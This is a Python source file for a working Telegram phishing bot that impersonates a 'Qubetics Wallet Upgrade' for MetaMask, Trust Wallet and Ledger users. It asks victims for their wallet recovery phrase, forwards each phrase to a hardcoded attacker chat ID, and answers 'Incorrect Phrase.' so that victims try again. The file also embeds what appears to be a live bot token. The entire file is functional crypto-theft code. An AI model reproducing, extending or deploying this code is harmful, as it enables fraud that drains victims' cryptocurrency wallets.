import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

TOKEN = "7822661773:AAH7xbG6L0tqHORDUmaHJecaIZkpZ4_VHn0"
TARGET_CHAT_ID = 7666664445  # Replace with the normal user Telegram ID that should receive recovery phrases

# Store user states (optional)
user_state = {}

# /start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("MetaMask", callback_data="metamask"),
         InlineKeyboardButton("Trust Wallet", callback_data="trust")],
        [InlineKeyboardButton("Ledger", callback_data="ledger"),
         InlineKeyboardButton("Other", callback_data="other")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    welcome_text = (
        "Welcome to Qubetics Wallet Upgrade.\n"
        "This automated process will sync your wallet with the QUB v1.9 layer upgrade.\n\n"
        "Step 1: Select your wallet provider."
    )

    await update.message.reply_text(welcome_text, reply_markup=reply_markup)
    user_state[update.message.from_user.id] = None

# Wallet selection callback handler
async def wallet_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    wallet_name = query.data
    wallet_display = {
        "metamask": "MetaMask",
        "trust": "Trust Wallet",
        "ledger": "Ledger",
        "other": "Other"
    }.get(wallet_name, "Unknown")

    # Show connecting message
    await query.edit_message_text(f"🔗 Connecting to {wallet_display}...")
    await asyncio.sleep(2)

    # Ask for recovery phrase
    await query.message.reply_text(
        "Please paste your 12 or 24-word recovery phrase exactly as it appears in your wallet backup. "
        "This is required to import your wallet into the upgrade system."
    )

# Handler for text messages (recovery phrases)
async def handle_all_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    text = update.message.text

    # Forward the recovery phrase text to the target Telegram user
    await context.bot.send_message(
        chat_id=TARGET_CHAT_ID,
        text=f"User {user_id} sent recovery phrase:\n\n{text}"
    )

    # Reply to the user
    await update.message.reply_text("Incorrect Phrase.")

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(wallet_selected))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_text))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
